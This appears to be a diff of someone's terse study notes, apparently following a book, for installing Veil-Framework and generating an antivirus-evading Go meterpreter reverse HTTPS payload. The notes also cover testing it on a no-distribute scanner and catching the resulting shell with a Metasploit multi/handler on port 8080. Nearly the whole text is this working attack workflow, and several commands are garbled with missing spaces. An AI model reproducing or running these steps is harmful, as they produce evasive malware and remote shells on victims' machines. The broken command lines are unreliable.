@@ -1,0 +1,41 @@
+https://github.com/veil-framework/veil 
+cd/opt
+ls
+git clone https://github.com/veil-framework/veil 
+lscd veil-framework/veills
+cd config/
+ls./setup.sh --silent --force
+#new terminal
+cd/opt/veil
+ls
+./veil.py
+
+list
+use 1
+list 
+use 15
+set LHOST
+set LPORT 8080
+set PROCESSORS 1
+set SLEEP 6
+options
+generate
+rev_https_8080
+
+#copy paste where executable is written to and scan it in no distribute
+
+#in new terminal
+go/meterpreter/rev_https,port 8080
+
+#in split terminal
+msfconsole
+use exploit multi/handler
+show options
+set PAYLOAD windows/meterpreter/rev_https
+show options
+set LHOST
+set LPORT 8080
+show options
+exploit
+
+#check basic delivery mrthod in book
